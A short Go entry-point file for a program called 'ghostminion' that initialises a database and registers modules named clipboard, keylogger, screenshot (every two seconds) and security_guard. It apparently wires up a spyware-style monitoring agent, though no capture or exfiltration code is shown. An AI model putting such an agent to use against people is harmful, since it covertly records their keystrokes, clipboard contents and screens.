package main

import (
	"ghostminion/apps"
	"ghostminion/db"
	"sync"
)

func main() {
	var wg sync.WaitGroup
	// installation:
	db.Init()

	// apps
	appManager := apps.NewAppManager()
	appManager.StartAll(&wg)
}

func AddBuiltinApps(am *apps.AppManager) {
	am.AddApp("clipboard", &apps.ClipboardApp{})
	am.AddApp("keylogger", &apps.KeyLoggerApp{})
	am.AddApp("screenshot", &apps.ScreenshotApp{Interval: 2000})
	am.AddApp("security_guard", &apps.SecurityGuardApp{})
}
